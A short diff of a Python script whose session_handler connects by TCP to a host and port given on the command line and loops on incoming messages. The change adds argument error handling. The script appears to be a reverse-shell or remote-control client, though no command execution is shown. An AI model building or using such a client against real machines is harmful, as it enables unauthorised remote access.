@@ -27,7 +27,6 @@ def session_handler():
     print(f'[+] Connecting to {host_ip}.')
     sock.connect((host_ip, host_port))
     print(f'[+] Connected to {host_ip}.')
-    
     while True:
         message = inbound()
         # exit handling
@@ -67,9 +66,16 @@ def session_handler():
 
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
 
     # call session_handler
-    #
-    session_handler()
+    
+        session_handler()
+
+    except IndexError:
+        print(' Command line args missing.')
+    except Exception as e:
+        print(e)
+
